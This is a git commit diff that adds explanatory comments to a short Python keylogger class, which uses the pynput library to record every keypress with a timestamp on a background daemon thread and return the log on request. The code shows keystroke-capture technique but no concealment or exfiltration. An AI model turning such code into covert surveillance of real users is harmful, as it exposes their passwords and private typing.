40850223ac0cd0c23518315068384156eb112d0f
Harsh Varagiya <32223129+HarshVaragiya@users.noreply.github.com>
2018-06-11 00:07:23 +0530

    Update logger.py

--- logger.py
+++ logger.py
@@ -1,13 +1,13 @@
 #/usr/bin/python3
-import threading
-from pynput.keyboard import Key, Listener
-import datetime
-import time 
+import threading                                         # keylogger runs on seperate thread
+from pynput.keyboard import Key, Listener                # pynput library for keyboard
+import datetime                                          # get current time of key-press
+import time            
 class Logger(threading.Thread):
     def __init__(self):
         threading.Thread.__init__(self)
         self.log = []
-        self.daemon = True
+        self.daemon = True                               # daemon thread , so it exits when main program ends
 
     def run(self):
         with Listener(on_press=self.on_press) as listener:
@@ -15,16 +15,16 @@ class Logger(threading.Thread):
 
     def on_press(self,key):
         # print("Pressed - " + str(key))
-        self.time = str(datetime.datetime.now())[:-4]
-        self.string = str(self.time)+"-" + str(key) + "\n"
-        self.log.append(self.string)
+        self.time = str(datetime.datetime.now())[:-4]        # no need of microsecond accuracy in keypress times.
+        self.string = str(self.time)+"-" + str(key) + "\n"   # still change if required
+        self.log.append(self.string)                         # append to log list 
         #print(self.string)
     
-    def export_log(self):
+    def export_log(self):                                    # send logs as a list
         return self.log
     
-    def clear_log(self):
+    def clear_log(self):                                     # clear the logs
         self.log = []
     
-    def __del__(self):
+    def __del__(self):                                       # __del__ makes sure thread is stopped!
         self.is_alive = False
